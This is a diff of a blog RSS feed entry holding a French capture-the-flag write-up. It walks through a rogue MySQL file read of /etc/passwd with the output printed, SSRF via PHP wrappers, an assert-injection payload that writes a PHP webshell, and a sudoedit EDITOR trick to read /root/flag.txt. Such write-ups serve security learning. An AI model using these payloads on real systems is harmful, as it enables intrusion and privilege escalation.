@@ -15,11 +15,11 @@
             <pubDate>Tue, 31 Jan 2023 04:17:18 +0100</pubDate>
             
             <guid>https://SpawnZii.github.io/posts/2023/01/esna-x-worty-web-worty-is-my-cheat-sheet/</guid>
-            <description>Introduction Après la seconde place de l&amp;rsquo;ESNA au CTF Hack The Box University, nous nous sommes retrouvés avec plusieurs vouchers VIP inutilisé. Pour ne pas faire de gaspillage, Worty et Raccon ont monté un petit ctf afin de faire gagner les vouchers.
+            <description>Introduction Après la seconde place de l&amp;rsquo;ESNA au CTF Hack The Box University, nous nous sommes retrouvés avec plusieurs vouchers VIP inutilisé. Pour ne pas faire de gaspillage, Worty et Raccoon ont monté un petit ctf afin de faire gagner les vouchers.
 How to easily bypass htaccess. Pour cette première step on tombe sur une basic auth nous bloquant l&amp;rsquo;accès au site web. Après avoir essayé de bypass la basic auth pendant 1h j&amp;rsquo;ai checké le discord :</description>
             <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
 <p>Après la seconde place de l&rsquo;ESNA au CTF Hack The Box University, nous nous sommes retrouvés avec plusieurs vouchers VIP inutilisé.
-Pour ne pas faire de gaspillage, Worty et Raccon ont monté un petit ctf afin de faire gagner les vouchers.</p>
+Pour ne pas faire de gaspillage, Worty et Raccoon ont monté un petit ctf afin de faire gagner les vouchers.</p>
 <h2 id="how-to-easily-bypass-htaccess">How to easily bypass htaccess.</h2>
 <p>Pour cette première step on tombe sur une basic auth nous bloquant l&rsquo;accès au site web.
 Après avoir essayé de bypass la basic auth pendant 1h j&rsquo;ai checké le discord :</p>
@@ -36,11 +36,25 @@ e = 64
 <p>Après avoir &ldquo;trouvé&rdquo; les creds on tombe directement sur un panel de configuration d&rsquo;une base de données.</p>
 <p><img src="/posts/rogue/db.png" alt="form"></p>
 <p>On comprend donc qu&rsquo;il faut exploiter une rogue SQL :).
-J&rsquo;ai utilisé un <a href="https://github.com/jib1337/Rogue-MySQL-Server">tool sur github</a>.</p>
+J&rsquo;ai utilisé un <a href="https://github.com/jib1337/Rogue-MySQL-Server">tool</a> que j&rsquo;ai trouvé sur github.</p>
 <p>Petit test pour récupérer <code>/etc/passwd</code>.</p>
 <p><img src="/posts/rogue/req.png" alt="form"></p>
 <p><img src="/posts/rogue/passwd.png" alt="form"></p>
-<p>J&rsquo;ai ensuite leak le source code de l&rsquo;app.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+</code></pre></div><p>J&rsquo;ai ensuite leak le source code de l&rsquo;app.</p>
 <p><img src="/posts/rogue/index.png" alt="form"></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
 <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;ip&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;username&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;password&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span>
@@ -95,11 +109,13 @@ if($res === false)
   ...
 }
 </code></pre></div><p>Il est possible d&rsquo;utiliser des wrappers php (php://,file:// &hellip;)dans notre rogue SQL, on peut donc utiliser <strong>http://</strong> pour faire une SSRF.</p>
-<p>Exemple : <code>python2 ../RogueSQL.py -f &quot;http://127.0.0.1/index.php?table=users</code>
-Maintenant J&rsquo;ai j&rsquo;upload mon webshell dans <strong>/var/www/html/</strong>.</p>
+<p>Exemple : <code>python2 ../RogueSQL.py -f &quot;http://127.0.0.1/index.php?table=users</code></p>
+<p>Il ne reste plus qu'à crafter notre payload pour injecter dans le assert.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#39;)===system(&#39;</span>echo%20<span style="color:#ae81ff">\&#39;</span>&lt;?<span style="color:#f92672">=</span><span style="color:#ae81ff">\`\$</span>_GET<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span><span style="color:#ae81ff">\`</span>;?&gt;<span style="color:#ae81ff">\&#39;</span>&gt;/var/www/html/spz.php<span style="color:#e6db74">&#39;)||intval(&#39;</span>1<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#e6db74">&#34;
+</span></code></pre></div><p>Je peux maintenant upload mon webshell dans <strong>/var/www/html/</strong>.</p>
 <pre><code class="language-=bash" data-lang="=bash">python2 ../RogueSQL.py -f &quot;http://127.0.0.1/index.php?table=users')===system('echo%20\'&lt;?=\`\$_GET[0]\`;?&gt;\'&gt;/var/www/html/spz.php')||intval('1'&quot;
 </code></pre><p><img src="/posts/rogue/pld.png" alt="form"></p>
-<p>On peut appeler notre webshell.</p>
+<p>Bingo on a notre RCE :).</p>
 <p><img src="/posts/rogue/id.png" alt="form"></p>
 <h2 id="privesc">Privesc</h2>
 <p>Notre utilisateur à des droits sudo :), en version 1.8.19p1.</p>
@@ -108,6 +124,7 @@ Maintenant J&rsquo;ai j&rsquo;upload mon webshell dans <strong>/var/www/html/</s
 <pre><code class="language-=bash" data-lang="=bash">export EDITOR=&quot;nano -- /root/flag.txt&quot; 
 sudo /usr/bin/sudoedit /etc/hosts
 </code></pre><p><img src="/posts/rogue/flag.png" alt="form"></p>
+<p>Un petit challenge sympa, merci à Worty et Raccoon.</p>
 ]]></content>
         </item>
         
